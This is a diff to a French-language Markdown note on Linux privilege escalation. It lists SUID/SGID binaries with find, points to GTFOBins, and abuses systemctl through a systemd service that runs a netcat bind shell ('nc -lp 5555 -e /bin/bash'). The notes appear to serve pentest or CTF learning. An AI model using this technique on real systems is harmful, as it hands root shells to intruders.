@@ -12,7 +12,7 @@ find / -perm -4000 -o -perm -2000 -exec ls -ldb {} \; 2>/dev/null | tee output
 ```
 
 Explication :
-```bash
+```txt
 find \                # lister tout les fichiers
   / \                 # depuis la racine
   -perm -4000 \       # qui ont le bit SUID d'activer
@@ -26,18 +26,19 @@ Pour lister uniquement le nom des binaires à partir du fichier `output`:
 cat output | rev | cut -d '/' -f 1 | rev | sort -u
 ```
 
-Une fois qu'on à trouvé un binaire intéressant chercher une potentielle 
+Une fois qu'on a trouvé un binaire intéressant chercher une potentielle 
 exploitation depuis le site [GTFOBins](https://gtfobins.github.io/).
 
 
 ### Systemctl
 
-[GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/) nous donne un poc
-qui execute la commande `id`. Pour obtenir un shell, cela demande quelques
+[GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/) nous donne un POC
+qui exécute la commande `id`. Pour obtenir un shell, cela demande quelques
 modifications.
 
 Par exemple, si netcat est disponible:
-```systemd
+
+```txt
 [Service]
 Type=oneshot
 ExecStart=/bin/sh -c "nc -lp 5555 -e /bin/bash"
